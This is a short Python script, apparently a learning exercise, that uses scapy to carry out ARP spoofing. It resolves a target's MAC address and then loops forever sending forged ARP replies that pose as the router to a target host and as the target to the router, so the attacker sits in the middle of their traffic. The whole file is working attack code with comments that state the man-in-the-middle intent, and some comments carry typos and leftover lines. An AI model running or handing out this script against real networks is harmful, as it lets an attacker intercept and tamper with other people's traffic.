#!/usr/bin/env python

import scapy.all as scapy
import time

# scapy.ARP(op=2) = allows us to receive packets
# scapy.ARP(pdst) = ip of target
# scapy.ARP(hwdst) = MAC of target
# scapy.ARP(srdst) = router gateway IP, we are MitM'ing
def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    target_mac = answered[0][1].hwsrc
    return target_mac
    
def spoof(target_ip, spoof_ip):
    target_mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    # print(show)
    # print(summary)
    scapy.send(packet)


# we use a while loop to continuously send packets and stay MitM
while True:
    # ip - target, ip2 - router
    # I am telling the target I am the router
    spoof("192.168.56.112", '10.0.2.2') 
    # I am telling the router I am the client
    spoof("10.0.2.2", "192.168.56.112")
    time.sleep(2)
    # I am telling the router to send back to that IP so that don't know I am in the middle
    # get_mac('10.0.2.2')
    # show = (packet.show())
    # summary = (packet.summar())
